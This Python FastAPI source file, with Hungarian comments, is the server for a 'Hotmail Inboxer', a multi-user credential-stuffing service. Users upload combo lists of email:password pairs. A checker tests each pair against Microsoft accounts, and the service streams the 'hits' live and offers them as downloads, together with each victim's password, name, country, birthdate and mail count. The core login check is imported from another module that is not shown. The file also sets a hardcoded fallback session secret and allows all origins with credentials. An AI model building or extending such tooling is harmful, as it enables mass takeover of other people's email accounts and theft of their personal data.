from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect, Depends, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.requests import Request
from starlette.middleware.sessions import SessionMiddleware
from starlette.middleware.cors import CORSMiddleware
import asyncio
import threading
import os
import json
from datetime import datetime

from database import *
from auth import *
from checker import checker_worker_single

app = FastAPI(title="Hotmail Inboxer Multi-User")

# Middleware
app.add_middleware(
    SessionMiddleware,
    secret_key=os.getenv("SECRET_KEY", "secret-key-change-this")
)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Templates & Static
templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")

# WebSocket connections per user
user_connections = {}  # {user_id: [ws_info1, ws_info2, ...]}
ws_lock = threading.Lock()

# ============================================================
# WEBSOCKET BROADCAST (csak adott usernek)
# ============================================================
def broadcast_to_user(user_id: str, message: str):
    """Üzenet küldése egy adott user összes kapcsolatának"""
    with ws_lock:
        if user_id in user_connections:
            dead = []
            for ws_info in user_connections[user_id]:
                try:
                    loop = ws_info["loop"]
                    ws = ws_info["ws"]
                    asyncio.run_coroutine_threadsafe(ws.send_text(message), loop)
                except Exception as e:
                    dead.append(ws_info)
            for d in dead:
                user_connections[user_id].remove(d)
            if not user_connections[user_id]:
                del user_connections[user_id]

# ============================================================
# AUTH ROUTES
# ============================================================
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    """Login oldal"""
    return templates.TemplateResponse("login.html", {"request": request})

@app.get("/register", response_class=HTMLResponse)
async def register_page(request: Request):
    """Regisztráció oldal"""
    return templates.TemplateResponse("register.html", {"request": request})

@app.post("/api/register")
async def register(email: str = Form(...), password: str = Form(...)):
    """Regisztráció endpoint"""
    # Email ellenőrzés
    existing = await get_user_by_email(email)
    if existing:
        raise HTTPException(status_code=400, detail="Ez az email már regisztrálva van")
    
    # Jelszó min. hossz
    if len(password) < 6:
        raise HTTPException(status_code=400, detail="A jelszónak legalább 6 karakter hosszúnak kell lennie")
    
    # User létrehozás
    hashed_pw = hash_password(password)
    user_id = await create_user(email, hashed_pw)
    
    # Token generálás
    token = create_access_token({"sub": email})
    
    return {"token": token, "email": email}

@app.post("/api/login")
async def login(email: str = Form(...), password: str = Form(...)):
    """Bejelentkezés endpoint"""
    user = await get_user_by_email(email)
    if not user or not verify_password(password, user["password"]):
        raise HTTPException(status_code=401, detail="Hibás email vagy jelszó")
    
    token = create_access_token({"sub": email})
    return {"token": token, "email": email}

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard(request: Request):
    """Dashboard oldal (védett)"""
    return templates.TemplateResponse("dashboard.html", {"request": request})

@app.get("/api/me")
async def get_me(current_user = Depends(get_current_user)):
    """Bejelentkezett user adatai"""
    return {
        "email": current_user["email"],
        "created_at": current_user["created_at"].isoformat()
    }

# ============================================================
# CHECKER ROUTES
# ============================================================
@app.post("/api/start")
async def start_checker(
    file: UploadFile,
    keyword: str = Form(...),
    current_user = Depends(get_current_user)
):
    """Checker indítása"""
    # Ellenőrizzük, hogy van-e már futó checker-e
    active = await get_active_run(str(current_user["_id"]))
    if active:
        raise HTTPException(
            status_code=400,
            detail="Már fut egy checker! Várd meg, amíg befejeződik."
        )
    
    # Combo fájl beolvasása
    content = await file.read()
    combo_text = content.decode("utf-8", errors="ignore")
    
    # Validálás
    lines = [l.strip() for l in combo_text.splitlines() if ':' in l and '@' in l]
    total = len(lines)
    
    if total == 0:
        raise HTTPException(status_code=400, detail="Nincs érvényes combo a fájlban")
    
    if total > 10000:
        raise HTTPException(status_code=400, detail="Maximum 10000 account engedélyezett egyszerre")
    
    # MongoDB-ben létrehozzuk a run-t
    run_id = await create_run(str(current_user["_id"]), keyword, total)
    
    # Háttérben indítjuk a checker-t
    threading.Thread(
        target=run_checker_thread,
        args=(run_id, str(current_user["_id"]), lines, keyword),
        daemon=True
    ).start()
    
    return {"run_id": run_id, "total": total}

def run_checker_thread(run_id: str, user_id: str, lines: list, keyword: str):
    """Háttérszál - végrehajtja a checker-t"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_checker(run_id, user_id, lines, keyword))
    loop.close()

async def run_checker(run_id: str, user_id: str, lines: list, keyword: str):
    """Checker futtatás (async)"""
    checked = hits = custom = bad = retries = 0
    total = len(lines)
    
    # Kezdő log
    broadcast_to_user(user_id, json.dumps({
        "type": "log",
        "level": "info",
        "text": f"[START] {total} account betöltve! Keyword: {keyword}"
    }))
    
    for line in lines:
        if ':' not in line or '@' not in line:
            continue
        
        try:
            email, password = line.split(':', 1)
        except:
            continue
        
        # Checker hívás (szinkron függvény async-ból)
        result = await asyncio.to_thread(checker_worker_single, email, password, keyword)
        
        checked += 1
        
        # Eredmény feldolgozása
        if result["status"] == "hit":
            hits += 1
            data = result["data"]
            line_text = (
                f"{data['email']}:{data['password']} | "
                f"Country={data['country']} | Name={data['name']} | "
                f"Birthdate={data['birthdate']} | Date={data['date']} | "
                f"Mails={data['mails']}"
            )
            await add_result_to_run(run_id, "hit", line_text)
            broadcast_to_user(user_id, json.dumps({
                "type": "log",
                "level": "hit",
                "text": f"[HIT] {line_text}"
            }))
            
        elif result["status"] == "custom":
            custom += 1
            data = result["data"]
            line_text = (
                f"{data['email']}:{data['password']} | "
                f"Country={data['country']} | Name={data['name']} | "
                f"Birthdate={data['birthdate']}"
            )
            await add_result_to_run(run_id, "custom", line_text)
            broadcast_to_user(user_id, json.dumps({
                "type": "log",
                "level": "custom",
                "text": f"[CUSTOM] {line_text}"
            }))
            
        elif result["status"] == "bad":
            bad += 1
            broadcast_to_user(user_id, json.dumps({
                "type": "log",
                "level": "bad",
                "text": f"[BAD] {email}"
            }))
            
        else:  # error
            retries += 1
        
        # Stats frissítése MongoDB-ben
        await update_run_stats(run_id, {
            "checked": checked,
            "hits": hits,
            "custom": custom,
            "bad": bad,
            "retries": retries
        })
        
        # Stats küldése WebSocket-en
        broadcast_to_user(user_id, json.dumps({
            "type": "stats",
            "run_id": run_id,
            "checked": checked,
            "hits": hits,
            "custom": custom,
            "bad": bad,
            "retries": retries,
            "total": total
        }))
        
        # Rate limit (ne bombázzuk a Microsoft-ot)
        await asyncio.sleep(0.3)
    
    # Futtatás lezárása
    await finish_run(run_id)
    
    broadcast_to_user(user_id, json.dumps({
        "type": "log",
        "level": "finish",
        "text": f"[KÉSZ] Hits: {hits} | Custom: {custom} | Bad: {bad}"
    }))
    
    broadcast_to_user(user_id, json.dumps({
        "type": "finished",
        "run_id": run_id
    }))

@app.get("/api/runs")
async def get_runs(current_user = Depends(get_current_user)):
    """User összes futtatásának lekérése"""
    runs = await get_user_runs(str(current_user["_id"]))
    
    # ObjectId -> string konverzió
    for run in runs:
        run["_id"] = str(run["_id"])
        run["started_at"] = run["started_at"].isoformat()
        if run["finished_at"]:
            run["finished_at"] = run["finished_at"].isoformat()
    
    return runs

@app.get("/api/run/{run_id}")
async def get_run_details(run_id: str, current_user = Depends(get_current_user)):
    """Egy futtatás részletes adatai"""
    run = await get_run(run_id)
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404, detail="Futtatás nem található")
    
    run["_id"] = str(run["_id"])
    run["started_at"] = run["started_at"].isoformat()
    if run["finished_at"]:
        run["finished_at"] = run["finished_at"].isoformat()
    
    return run

@app.get("/api/download/{run_id}/{type}")
async def download_results(
    run_id: str,
    type: str,  # hits vagy custom
    current_user = Depends(get_current_user)
):
    """Eredmények letöltése TXT formában"""
    run = await get_run(run_id)
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404, detail="Futtatás nem található")
    
    if type == "hits":
        lines = run.get("hit_lines", [])
        filename = f"Hotmail-Hits-{run_id}.txt"
    elif type == "custom":
        lines = run.get("custom_lines", [])
        filename = f"Hotmail-Custom-{run_id}.txt"
    else:
        raise HTTPException(status_code=400, detail="Érvénytelen típus")
    
    content = "\n".join(lines)
    
    return PlainTextResponse(
        content=content,
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"'
        }
    )

# ============================================================
# WEBSOCKET
# ============================================================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str):
    """WebSocket kapcsolat (live updates)"""
    await websocket.accept()
    
    # Token validálás
    email = decode_token(token)
    if not email:
        await websocket.close(code=1008, reason="Invalid token")
        return
    
    user = await get_user_by_email(email)
    if not user:
        await websocket.close(code=1008, reason="User not found")
        return
    
    user_id = str(user["_id"])
    
    # WebSocket regisztrálása
    loop = asyncio.get_event_loop()
    ws_info = {"ws": websocket, "loop": loop}
    
    with ws_lock:
        if user_id not in user_connections:
            user_connections[user_id] = []
        user_connections[user_id].append(ws_info)
    
    # Aktív run elküldése (ha van)
    active_run = await get_active_run(user_id)
    if active_run:
        active_run["_id"] = str(active_run["_id"])
        active_run["started_at"] = active_run["started_at"].isoformat()
        await websocket.send_text(json.dumps({
            "type": "active_run",
            "run": active_run
        }))
    
    try:
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
    except WebSocketDisconnect:
        with ws_lock:
            if user_id in user_connections and ws_info in user_connections[user_id]:
                user_connections[user_id].remove(ws_info)
                if not user_connections[user_id]:
                    del user_connections[user_id]

# ============================================================
# INDÍTÁS
# ============================================================
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    
    print(f"\n{'='*60}")
    print(f"  🚀 Hotmail Inboxer Multi-User")
    print(f"  📡 http://0.0.0.0:{port}")
    print(f"  🔐 MongoDB: {'✅ Connected' if MONGODB_URL else '❌ Not configured'}")
    print(f"{'='*60}\n")
    
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port,
        reload=False,
        log_level="info"
    )
